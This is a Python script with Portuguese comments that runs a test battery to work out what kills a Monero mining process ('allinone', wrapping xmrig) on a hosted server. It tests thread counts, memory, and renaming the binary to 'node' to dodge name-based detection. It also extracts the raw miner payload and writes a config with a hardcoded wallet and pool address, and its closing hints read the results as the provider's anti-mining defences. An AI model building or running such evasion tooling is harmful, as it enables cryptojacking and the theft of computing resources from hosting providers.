#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
battery.py - Bateria de testes para descobrir O QUE mata o processo de mineracao.
Roda no mesmo Linux/servidor onde o allinone roda.

Uso:
    python3 battery.py                    # roda tudo com ./allinone
    python3 battery.py --bin /path/allinone
    python3 battery.py --only cpu,rename  # so alguns testes
    python3 battery.py --time 20          # duracao de cada teste (default 15s)
    python3 battery.py --url URL          # URL do tunel (default: le url.txt)

Cada teste sobe o processo, monitora CPU/RAM/sinais e reporta se foi morto e por que.
"""
import argparse
import os
import shutil
import signal
import subprocess
import sys
import tempfile
import threading
import time

NC = os.cpu_count() or 1

def read_proc_stat(pid):
    try:
        with open(f"/proc/{pid}/stat", "r") as f:
            parts = f.read().split()
        # comm vem entre parenteses e pode ter espacos
        comm_end = 0
        for i, p in enumerate(parts):
            if p.endswith(")"):
                comm_end = i
                break
        base = parts[comm_end + 1:]
        # fields after comm: state=0, ppid=1, ..., utime=11, stime=12 (index in base)
        state = base[0]
        ppid = int(base[1])
        utime = int(base[11])
        stime = int(base[12])
        rss_pages = int(base[21])
        return state, ppid, utime, stime, rss_pages
    except Exception:
        return None

def scan_procs():
    """Le /proc e retorna {pid: (ppid, utime, stime, rss_pages)}."""
    out = {}
    try:
        for d in os.listdir("/proc"):
            if not d.isdigit():
                continue
            s = read_proc_stat(int(d))
            if s:
                _, ppid, u, st, rss = s
                out[int(d)] = (ppid, u, st, rss)
    except Exception:
        pass
    return out

def cpu_ticks(pid):
    s = read_proc_stat(pid)
    if not s:
        return 0, 0
    return s[2], s[3]

def sys_cpu_total():
    try:
        with open("/proc/stat", "r") as f:
            line = f.readline().split()[1:]
        return sum(int(x) for x in line)
    except Exception:
        return 0

class Monitor(threading.Thread):
    """Monitora o processo e TODOS os seus descendentes (o wrapper allinone
    spawna o minerador 'core' como filho). Soma CPU e RSS da arvore toda."""
    def __init__(self, proc):
        super().__init__(daemon=True)
        self.proc = proc
        self.peak_cpu = 0.0
        self.peak_rss = 0
        self.samples = []
        self.stop = threading.Event()

    @staticmethod
    def tree_pids(root):
        """Retorna o conjunto de pids: root + todos os descendentes."""
        procs = scan_procs()
        kids = {}
        for pid, (ppid, u, st, rss) in procs.items():
            kids.setdefault(ppid, []).append(pid)
        result = set()
        frontier = [root]
        while frontier:
            p = frontier.pop()
            if p in result:
                continue
            result.add(p)
            frontier.extend(kids.get(p, []))
        return result

    @staticmethod
    def sum_ticks(pids):
        u = s = 0
        for pid in pids:
            st = read_proc_stat(pid)
            if st:
                u += st[2]
                s += st[3]
        return u, s

    @staticmethod
    def sum_rss(pids):
        rss = 0
        for pid in pids:
            st = read_proc_stat(pid)
            if st:
                rss += st[4]
        return rss

    def run(self):
        pid = self.proc.pid
        pids = self.tree_pids(pid)
        prev_u, prev_s = self.sum_ticks(pids)
        prev_total = sys_cpu_total()
        prev_t = time.time()
        while not self.stop.is_set():
            time.sleep(0.2)
            pids = self.tree_pids(pid)
            if not pids:
                break
            now = time.time()
            u, s = self.sum_ticks(pids)
            total = sys_cpu_total()
            dt = now - prev_t
            dcpu = (u - prev_u) + (s - prev_s)
            dtotal = total - prev_total
            if dt > 0 and dtotal > 0:
                pct = (dcpu / dtotal) * 100.0
            else:
                pct = 0.0
            if pct > self.peak_cpu:
                self.peak_cpu = pct
            rss = self.sum_rss(pids) * (os.sysconf("SC_PAGE_SIZE") // 1024)
            if rss > self.peak_rss:
                self.peak_rss = rss
            self.samples.append((now - prev_t, pct, rss))
            prev_u, prev_s, prev_total, prev_t = u, s, total, now

    def stop_mon(self):
        self.stop.set()

def check_oom(pid=None):
    """Procura sinais de OOM killer / cgroup kill nos logs."""
    lines = []
    for src in ("/var/log/kern.log", "/var/log/syslog"):
        try:
            with open(src, "r", errors="ignore") as f:
                for ln in f:
                    low = ln.lower()
                    if "oom" in low or "killed process" in low or "out of memory" in low:
                        lines.append(ln.rstrip()[-300:])
        except Exception:
            pass
    if pid is not None:
        try:
            with open(f"/proc/{pid}/cgroup", "r") as f:
                lines.append("cgroup: " + f.read().strip())
        except Exception:
            pass
    return lines[-8:]

def cgroup_limits():
    out = {}
    for p, key in [
        ("/sys/fs/cgroup/cpu.max", "cpu.max"),
        ("/sys/fs/cgroup/cpu.stat", "cpu.stat"),
        ("/sys/fs/cgroup/memory.max", "memory.max"),
        ("/sys/fs/cgroup/memory.high", "memory.high"),
        ("/sys/fs/cgroup/pids.max", "pids.max"),
        ("/sys/fs/cgroup/cpuset.cpus.effective", "cpuset.effective"),
        ("/sys/fs/cgroup/cpu.pressure", "cpu.pressure"),
    ]:
        try:
            with open(p, "r") as f:
                out[key] = f.read().strip().replace("\n", " | ")
        except Exception:
            out[key] = "n/d"
    try:
        with open("/sys/fs/cgroup/cgroup.controllers", "r") as f:
            out["controllers"] = f.read().strip()
    except Exception:
        out["controllers"] = "n/d"
    return out

def find_pool_url(urlfile):
    try:
        with open(urlfile, "r") as f:
            return f.read().strip()
    except Exception:
        return ""

def kill_stale():
    """Mata wrappers/workers antigos que possam segurar a porta 14445
    (o loop de auto-restart do allinone vive para sempre)."""
    import glob as _glob
    killed = []
    for pid in list(scan_procs()):
        try:
            with open(f"/proc/{pid}/cmdline", "rb") as f:
                cl = f.read().replace(b"\x00", b" ").decode(errors="ignore")
            name = os.path.basename(cl.split()[0]) if cl.split() else ""
        except Exception:
            name = ""
        if name in ("allinone", "core", "node", "bash") and "wd_" in cl:
            try:
                os.kill(pid, signal.SIGKILL)
                killed.append((pid, name))
            except Exception:
                pass
    # tambem limpa dirs temporarios do wrapper
    for d in _glob.glob("/tmp/wd_*"):
        shutil.rmtree(d, ignore_errors=True)
    return killed

def run_test(name, cmd, cwd, url, duration, env=None):
    """Roda cmd, monitora, e retorna dict com resultado."""
    res = {
        "test": name,
        "cmd": " ".join(cmd),
        "ok": False,
        "alive_until_end": False,
        "returncode": None,
        "signal": None,
        "peak_cpu": 0.0,
        "peak_rss_mb": 0,
        "elapsed": 0.0,
        "oom": [],
        "cgroup": {},
        "stderr": "",
    }
    start = time.time()
    try:
        proc = subprocess.Popen(
            cmd, cwd=cwd, env=env, stdout=subprocess.DEVNULL,
            stderr=subprocess.PIPE,
        )
    except Exception as e:
        res["ok"] = False
        res["signal"] = f"spawn error: {e}"
        return res

    mon = Monitor(proc)
    mon.start()

    timeout_at = start + duration
    exited = False
    while time.time() < timeout_at:
        rc = proc.poll()
        if rc is not None:
            exited = True
            break
        time.sleep(0.1)

    if not exited:
        # sobreviveu ao tempo do teste
        proc.terminate()
        try:
            proc.wait(timeout=3)
        except Exception:
            proc.kill()
        res["alive_until_end"] = True
        res["signal"] = "SIGTERM (teste terminou, nao morreu sozinho)"
        res["ok"] = True
    else:
        rc = proc.returncode
        res["returncode"] = rc
        if rc is None:
            res["signal"] = "desconhecido"
        elif rc < 0:
            sig = -rc
            try:
                res["signal"] = signal.Signals(sig).name
            except Exception:
                res["signal"] = f"SIG??({sig})"
            if sig == 9:
                res["ok"] = False
            elif sig in (15, 2):
                res["ok"] = True
        elif rc == 0:
            res["signal"] = "exit 0"
            res["ok"] = True
        else:
            res["signal"] = f"exit {rc}"
            res["ok"] = False

    try:
        res["stderr"] = proc.stderr.read().decode(errors="replace")[-1500:]
        proc.stderr.close()
    except Exception:
        pass

    mon.stop_mon()
    mon.join(timeout=2)
    res["peak_cpu"] = round(mon.peak_cpu, 1)
    res["peak_rss_mb"] = round(mon.peak_rss / 1024, 1)
    res["elapsed"] = round(time.time() - start, 2)
    res["oom"] = check_oom(proc.pid if not exited else None)
    res["cgroup"] = cgroup_limits()
    return res

def extract_payload(binary_path, dest):
    """Extrai o payload (xmrig) rodando allinone --dump? Nao - usa /tmp do wrapper.
    Melhor: roda o binario com --dump para pegar o config e captura o payload do /tmp."""
    # O allinone extrai 'core' em /tmp/wd_XXXX/core. Rodamos por 6s e procuramos.
    tmp = tempfile.mkdtemp(prefix="battery_payload_")
    proc = subprocess.Popen([binary_path, "--core", "1"],
                            stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL,
                            cwd=os.path.dirname(binary_path))
    time.sleep(4)
    found = None
    for d in os.listdir("/tmp"):
        if d.startswith("wd_"):
            p = os.path.join("/tmp", d, "core")
            if os.path.exists(p):
                found = p
                break
    if found:
        shutil.copy(found, dest)
        proc.terminate()
        try:
            proc.wait(timeout=2)
        except Exception:
            proc.kill()
        return True
    proc.terminate()
    try:
        proc.wait(timeout=2)
    except Exception:
        proc.kill()
    return False

def write_miner_config(dest, pool_url, threads):
    """Escreve conf.json para o payload direto apontando ao pool.
    pool_url aqui deve ser stratum+tcp://host:port da pool REAL, pois o xmrig
    bruto nao entende wss/tunel."""
    cfg = {
        "autosave": False,
        "background": False,
        "colors": False,
        "cpu": {"max-threads-hint": 100, "threads": [1] * threads},
        "pools": [{"url": pool_url, "user": "4AYnVwr72kyPwneqKeDhgf9kkU22xSYHDhf8Qdyy1w9Z8RanMCpsbZUR9Xh3Eq8JeQ5z8YJ1cL9TZEMTYBcasB8CHVbi2VP", "pass": "x", "keepalive": True, "tls": False}],
        "http": {"enabled": False, "host": "127.0.0.1", "port": 0},
        "donate-level": 0,
        "health-print-time": 30,
        "randomx": {"mode": "light", "1gb-pages": False, "rdmsr": True, "wrmsr": True},
    }
    with open(dest, "w") as f:
        import json
        json.dump(cfg, f)

def run_battery(binary, duration, url, only, tmpdir):
    results = []
    bin_abs = os.path.abspath(binary)
    bdir = os.path.dirname(bin_abs)
    urlfile = os.path.join(bdir, "url.txt")

    if not url:
        url = find_pool_url(urlfile)
    if not url:
        url = "https://127.0.0.1:1"
    print(f"[+] binario    : {bin_abs}")
    print(f"[+] url        : {url}")
    print(f"[+] duracao/test: {duration}s")
    print(f"[+] cpus       : {NC}")
    print(f"[+] cgroup     : {cgroup_limits()}")

    stale = kill_stale()
    if stale:
        print(f"[!] processos antigos mortos: {stale}")
    time.sleep(1)
    print("=" * 70)

    tests = []
    if "alive" in only or "all" in only:
        tests.append(("alive-1s", [binary, "--core", "1", "--ram", "400"], 0, True))
    if "cpu1" in only or "all" in only:
        tests.append(("cpu1", [binary, "--core", "1", "--ram", "400"], 0, False))
    if "cpu2" in only or "all" in only:
        tests.append(("cpu2", [binary, "--core", "2", "--ram", "400"], 0, False))
    if "cpu4" in only or "all" in only:
        tests.append(("cpu4", [binary, "--core", "4", "--ram", "400"], 0, False))
    if "cpu8" in only or "all" in only:
        tests.append(("cpu8", [binary, "--core", "8", "--ram", "400"], 0, False))
    if "fast" in only or "all" in only:
        tests.append(("fast-ram2g", [binary, "--core", "4", "--ram", "2000"], 0, False))
    if "rename" in only or "all" in only:
        renamed = os.path.join(tmpdir, "node")
        try:
            shutil.copy2(bin_abs, renamed)
            os.chmod(renamed, 0o755)
            shutil.copy2(urlfile, os.path.join(tmpdir, "url.txt"))
            tests.append(("renamed-as-node", [renamed, "--core", "4", "--ram", "400"], 1, False))
        except Exception as e:
            print(f"[!] rename skip: {e}")

    for name, cmd, cwd_idx, short in tests:
        cwd = bdir if cwd_idx == 0 else tmpdir
        d = 3 if short else duration
        r = run_test(name, cmd, cwd, url, d)
        results.append(r)
        print(f"[*] {r['test']:18s} cpu={r['peak_cpu']:6.1f}% "
              f"ram={r['peak_rss_mb']:7.1f}MB t={r['elapsed']:5.1f}s "
              f"-> {r['signal']} {'SURVIVE' if r['alive_until_end'] else 'MORTO'}")
        if r["stderr"]:
            print(f"    stderr: {r['stderr'].splitlines()[0] if r['stderr'].splitlines() else r['stderr']}")
        sys.stdout.flush()

    if "payload" in only or "all" in only:
        payload = os.path.join(tmpdir, "core")
        if extract_payload(bin_abs, payload):
            write_miner_config(os.path.join(tmpdir, "conf.json"),
                               "stratum+tcp://205.172.58.170:10064", 2)
            r = run_test("payload-raw", [payload, "-c", os.path.join(tmpdir, "conf.json"), "--no-title", "--no-color"],
                         tmpdir, url, duration)
            results.append(r)
            print(f"[*] {r['test']:18s} cpu={r['peak_cpu']:6.1f}% "
                  f"ram={r['peak_rss_mb']:7.1f}MB t={r['elapsed']:5.1f}s "
                  f"-> {r['signal']} {'SURVIVE' if r['alive_until_end'] else 'MORTO'}")
            if r["stderr"]:
                print(f"    stderr: {r['stderr'].splitlines()[0] if r['stderr'].splitlines() else r['stderr']}")
        else:
            print("[!] nao consegui extrair o payload")

    print("=" * 70)
    print("RESUMO:")
    for r in results:
        status = "SOBREVIVEU" if r["alive_until_end"] else ("OK(esperado)" if r["ok"] else "MORTO")
        print(f"  {r['test']:18s} {status:11s} sinal={r['signal']} cpu={r['peak_cpu']}% ram={r['peak_rss_mb']}MB")
    if any(not r["ok"] and not r["alive_until_end"] for r in results):
        print("\n[!] Processos MORRERAM. Checando logs de OOM/kill:")
        for r in results:
            if r["oom"]:
                print(f"  --- {r['test']} ---")
                for ln in r["oom"]:
                    print(f"    {ln}")
    print("\n[+] DICA: se TODOS morrem com SIGKILL em ~5s, e' o anti-mineracao do provedor.")
    print("[+] Se morrem so com mais threads (cpu4/cpu8), pode ser limite de CPU/cgroup.")
    print("[+] Se 'renamed-as-node' sobrevive mas 'cpu4' morre, e' deteccao por nome/padrao.")

def main():
    ap = argparse.ArgumentParser(description="Bateria de testes anti-kill")
    ap.add_argument("--bin", default="./allinone")
    ap.add_argument("--time", type=int, default=15)
    ap.add_argument("--url", default="")
    ap.add_argument("--only", default="all",
                    help="virgula: all,alive,cpu1,cpu2,cpu4,cpu8,fast,rename,payload")
    args = ap.parse_args()

    tmpdir = tempfile.mkdtemp(prefix="battery_")
    only = [x.strip() for x in args.only.split(",")]
    try:
        run_battery(args.bin, args.time, args.url, only, tmpdir)
    finally:
        shutil.rmtree(tmpdir, ignore_errors=True)

if __name__ == "__main__":
    main()